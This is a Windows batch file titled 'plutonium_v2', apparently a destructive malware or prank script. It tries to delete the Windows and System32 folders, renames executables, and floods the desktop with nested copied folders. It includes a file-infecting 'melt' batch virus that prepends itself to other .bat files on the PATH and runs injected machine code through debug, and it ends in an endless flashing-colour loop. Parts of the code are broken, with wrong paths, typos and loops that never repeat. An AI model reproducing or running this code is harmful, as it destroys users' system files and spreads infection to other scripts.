@echo off
title plutonium_v2
color 0A
pause


del C:/Windows/
del C:/Windows/System32
del C:/Windows/System32/HKEY_LOCAL_MACHINE/
REN *.exe *.bin



cd C:/Desktop/
mkdir zb
cd zb
mkdir zb1
cd zb1
mkdir zb2
cd zb2
mkdir zb3
cd zb3
mkdir zb4
cd zb4
mkdir zb5
cd zb5
set loopCount=200
:loop1
echo WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW>C:/Desktop/zb/zb1/zb2/zb3/zb4/zb5/zbasset.txt
set /a loopCount=%loopCount%-1
if %loopCount%==0 goto :continue1
:continue1
set "sourcePath=C:/Desktop/zb/zb1/zb2/zb3/zb4/zb5/"
set "destinationPath="C:/Desktop/zb/zb1/zb2/zb3/zb4/"
set loopCount=200
:loop2
xcopy /E /I "%sourcePath%" "%destinationPath%"
set /a loopCount=%loopCount%-1
if %loopCount%==0 goto :continue2
:continue2
set "sourcePath=C:/Desktop/zb/zb1/zb2/zb3/zb4/"
set "destinationPath="C:/Desktop/zb/zb1/zb2/zb3/"
set loopCount=200
:loop3
xcopy /E /I "%sourcePath%" "%destinationPath%"
set /a loopCount=%loopCount%-1
if %loopCount%==0 goto :continue3
:continue3
set "sourcePath=C:/Desktop/zb/zb1/zb2/zb3/"
set "destinationPath="C:/Desktop/zb/zb1/zb2/"
set loopCount=200
:loop4
xcopy /E /I "%sourcePath%" "%destinationPath%"
set /a loopCount=%loopCount%-1
if %loopCount%==0 goto :continue4
:continue4
set "sourcePath=C:/Desktop/zb/zb1/zb2/"
set "destinationPath="C:/Desktop/zb/zb1/"
set loopCount=200
:loop5
xcopy /E /I "%sourcePath%" "%destinationPath%"
set /a loopCount=%loopCount%-1
if %loopCount%==0 goto :continue5
:continue5
set "sourcePath=C:/Desktop/zb/zb1/"
set "destinationPath="C:/Desktop/zb/"
set loopCount=200
:loop6
xcopy /E /I "%sourcePath%" "%destinationPath%"
set /a loopCount=%loopCount%-1
if %loopCount%==0 goto :continue6
:continue6
set "sourcePath=C:/Desktop/zb/"
set "destinationPath="C:/Desktop/"
set loopCount=200
:loop7
xcopy /E /I "%sourcePath%" "%destinationPath%"
set /a loopCount=%loopCount%-1
if %loopCount%==0 goto :continue7
:continue7



@if not '%0==' if '%_melt%==' goto meltbeg

@goto meltend [melt_2a]
:meltbeg
%_melt%
if '%1=="melt goto melt%2
if not exist %comspec% set comspec=%_melt%command
%comspec% /e:5000 /c %0 melt vir
set meltcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 melt rh
set _melt=
set meltcl=
goto meltend
:meltrh
set _melt=x
%0 %meltcl%
:meltvir
set melth=0
if not exist %_mellt%%temp%\nul set temp=%tmp%
if exist %temp%\melt_2a goto meltrun
%0 melt fnd . %path%
:meltfnd
shift%_melt%
if '%2==' exit melt
set melt=%2\%melth.bat
if not exist %melt% set melt=%2\%melth%
if not exist %melt% set melt=%2\%melth.bat
if not exist %melt% set melt=%2%melth%
if not exist %melt% goto meltfnd
find "melt"<%melt%>%temp%\melt_2a
attrib %temp%\melt_2a +h
:meltrun
%melth% melt s . .. %path%
:melts
shift%_melt
if '%2==' exit melt
for %%a in (%2\*.bat %2*.bat) do call %melth% melt inf %%a
goto melts
:meltinf
find /i "melt"<%3>nul
if not errorlevel 1 goto meltno
echo @if not '%%0==' if '%%_melt%%==' goto meltbeg>melt.t
type %3>>melt.t
echo.>>melt.t
type %temp%\me;t_2a>>melt.t
move melt.t %3>nul
exit melt
:meltact - flash-melt screen text then put back to normal
echo e 100 BA d0 07 BB 00 B8 8E C3 8B CA 33 FF 26 8B 05 FE>melt.t
echo e 110 C0 FE C4 26 89 05 47 47 E2 F2 FE 06 24 01 75 E8>>melt.t
echo e 120 B4 4C CD 21 00>>melt.t
echo g>>melt.t
debug <melt.t>nul
exit melt
:meltno
set meltc=%meltc%1
if %meltc%==1111111111 goto meltact
:meltend

echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
:szm
color 1A
timeout /t 1 /nobreak >nul
color 2A
timeout /t 1 /nobreak >nul
color 3A
timeout /t 1 /nobreak >nul
color 4A
timeout /t 1 /nobreak >nul
color 5A
timeout /t 1 /nobreak >nul
color 6A
timeout /t 1 /nobreak >nul
color 7A
timeout /t 1 /nobreak >nul
color 8A
timeout /t 1 /nobreak >nul
color 9A
goto :szm